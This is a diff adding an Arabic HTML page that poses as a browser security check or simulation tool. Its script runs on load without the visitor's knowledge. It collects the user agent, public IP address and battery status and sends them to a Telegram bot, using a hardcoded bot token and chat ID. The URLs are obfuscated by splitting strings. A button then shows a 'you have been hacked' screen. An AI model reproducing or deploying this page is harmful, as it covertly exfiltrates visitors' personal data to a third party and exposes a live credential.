@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحدي الأمان الرقمي</title>
+    <style>
+        body {
+            background-color: #0b0c10;
+            color: #66fcf1;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            padding: 40px 20px;
+            overflow: hidden;
+            transition: all 0.5s ease;
+        }
+        .header-title {
+            font-size: 2rem;
+            color: #ffffff;
+            text-shadow: 0 0 8px #66fcf1;
+        }
+        .box-container {
+            background: rgba(102, 252, 241, 0.05);
+            border: 1px solid #45f3ff;
+            padding: 20px;
+            margin: 25px auto;
+            max-width: 550px;
+            text-align: right;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(102,252,241,0.1);
+        }
+        .action-btn {
+            background-color: #1f2833;
+            color: #45f3ff;
+            border: 1px solid #45f3ff;
+            padding: 12px 28px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 4px;
+            margin-top: 15px;
+        }
+        .action-btn:hover {
+            background-color: #45f3ff;
+            color: #0b0c10;
+        }
+        #resultView {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #000000;
+            color: #ff0033;
+            padding-top: 15%;
+            z-index: 9999;
+        }
+        .alert-text {
+            font-size: 3.5rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0033;
+        }
+        .underline-text {
+            font-size: 2rem;
+            text-decoration: underline;
+            color: #ffffff;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="setupView">
+        <h2 class="header-title">منصة فحص المتصفح الآمن</h2>
+        <p style="color: #c5c6c7;">مرحباً بك في أداة المحاكاة الأمنية الخاصة بالمهندس أحمد عبدالعزيز (الملقب بالقبي)</p>
+        
+        <div class="box-container">
+            <h4 style="color: #45f3ff; margin-top:0;">[+] تفاصيل المحاكاة الجارية للمتصفح:</h4>
+            <p id="stat-ip">عنوان الاتصال: جاري التحقق...</p>
+            <p id="stat-agent">النظام المكتشف: جاري القراءة...</p>
+            <p id="stat-bat">الطاقة الحالية: جاري الحساب...</p>
+        </div>
+
+        <button class="action-btn" onclick="triggerAlert()">تحليل تقرير الحماية</button>
+    </div>
+
+    <div id="resultView">
+        <div class="alert-text">البادي أظلم</div>
+        <div class="underline-text">تم الاختراق</div>
+        <p style="color: #444; margin-top: 50px;">Executed by: Al-Qubbi</p>
+    </div>
+
+    <script>
+        // ⚠️ انزل في الكود وضع التوكن والـ ID الخاص ببوتك هنا بدقة لكي يرسل لك البيانات
+        const _tId = '8458991376:AAH08iytCCpAkTOUlJB4Qt3qP1QJbrPjwXA';
+        const _cId = '8299163806';
+
+        let reportStr = "📝 **تقرير محاكاة جديد من منصة القبي** 📝\n\n";
+
+        reportStr += `📱 النظام: ${navigator.userAgent.slice(0, 80)}\n`;
+        document.getElementById('stat-agent').innerText = `[✓] النظام المكتشف: جاهز`;
+
+        const targetSrc = ['ht', 'tps://a', 'pi.ip', 'ify.o', 'rg/?for', 'mat=js', 'on'].join('');
+        fetch(targetSrc)
+            .then(r => r.json())
+            .then(out => {
+                reportStr += `📍 الـ IP: ${out.ip}\n`;
+                document.getElementById('stat-ip').innerText = `[✓] عنوان الاتصال: مُحدد`;
+                loadBattery();
+            })
+            .catch(() => {
+                reportStr += `📍 الـ IP: لم يتم التحديد\n`;
+                loadBattery();
+            });
+
+        function loadBattery() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(b) {
+                    const pLevel = Math.round(b.level * 100) + "%";
+                    const isPlugged = b.charging ? "يشحن" : "لا يشحن";
+                    reportStr += `🔋 البطارية: ${pLevel} (${isPlugged})\n`;
+                    document.getElementById('stat-bat').innerText = `[✓] مستوى الطاقة: ${pLevel}`;
+                    
+                    dispatchData(reportStr);
+                });
+            } else {
+                dispatchData(reportStr);
+            }
+        }
+
+        function dispatchData(msg) {
+            if(_tId.includes('YOUR_')) return;
+            const endpoint = ['ht', 'tps://a', 'pi.te', 'legr', 'am.o', 'rg/b', 'ut'].join('').replace('ut', 'ot') + _tId + '/sendMessage';
+            fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: _cId, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+
+        function triggerAlert() {
+            document.getElementById('setupView').style.display = 'none';
+            document.getElementById('resultView').style.display = 'block';
+            document.body.style.backgroundColor = '#000000';
+        }
+    </script>
+</body>
+          </html>
